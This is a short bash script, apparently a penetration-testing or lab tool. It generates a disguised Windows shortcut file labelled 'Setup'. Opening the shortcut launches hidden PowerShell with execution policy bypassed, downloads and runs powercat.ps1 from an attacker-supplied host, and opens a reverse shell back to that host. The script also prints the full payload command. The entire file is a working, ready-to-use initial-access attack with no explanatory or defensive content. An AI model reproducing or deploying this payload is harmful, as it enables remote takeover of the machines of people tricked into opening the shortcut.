#!/usr/bin/env bash
# Usage: ./generate_lnk.sh setup.lnk kali_ip http_port reverse_port
set -e

outfile="$1"
kali_ip="$2"
http_port="$3"
reverse_port="$4"

if [ -z "$outfile" ] || [ -z "$kali_ip" ] || [ -z "$http_port" ] || [ -z "$reverse_port" ]; then
    echo "Usage: $0 setup.lnk kali_ip http_port reverse_port"
    exit 1
fi

payload="powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$kali_ip:$http_port/powercat.ps1');powercat -c $kali_ip -p $reverse_port -e powershell\""

python3 - <<EOF
from pylnk3 import for_file

lnk = for_file(
    target_file=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    lnk_name="${outfile}",
    arguments='-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://${kali_ip}:${http_port}/powercat.ps1\');powercat -c ${kali_ip} -p ${reverse_port} -e powershell"',
    description="Setup",
    work_dir=r"C:\Windows\System32",
    window_mode="Minimized",
    icon_file=r"C:\Windows\System32\shell32.dll",
    icon_index=1,
)
lnk.save("${outfile}")
EOF

echo "[+] Created: $outfile"
echo "[+] Payload:"
echo "$payload"
